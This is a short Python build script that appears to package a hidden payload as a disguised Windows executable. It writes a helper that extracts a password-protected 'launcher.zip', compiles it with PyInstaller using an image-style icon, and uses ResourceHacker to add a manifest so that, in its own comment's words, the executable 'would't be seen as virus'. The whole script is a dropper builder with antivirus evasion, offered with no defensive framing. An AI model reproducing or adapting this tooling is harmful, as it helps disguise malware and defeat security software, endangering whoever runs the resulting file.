from os import system

# Unzip launcher.zip with password 123
f = open("unzip.py", "w+")
f.write('import os'+'\n')
f.write('import zipfile'+'\n')
f.write('with zipfile.ZipFile(\'launcher.zip\') as file:'+'\n')
f.write('    file.extractall(pwd = bytes(\'123\', \'utf-8\'))'+'\n')
f.close()

print("[+] compiling")
#Use “png.ico” to change the application icon
system("pyinstaller -F --icon=png.ico unzip.py 2>nul")
print ("[+]Adding manifest")
#Use “ResourceHacker.exe” and “manifest.res” to make .exe would’t be seen as virus
file_name ='.\\dist\\unzip.exe'
system("ResourceHacker.exe -open " + file_name + " -resource manifest.res -action addskip -save "+ file_name)
print ("\n[+]Output generated at dist\\unzip.exe")
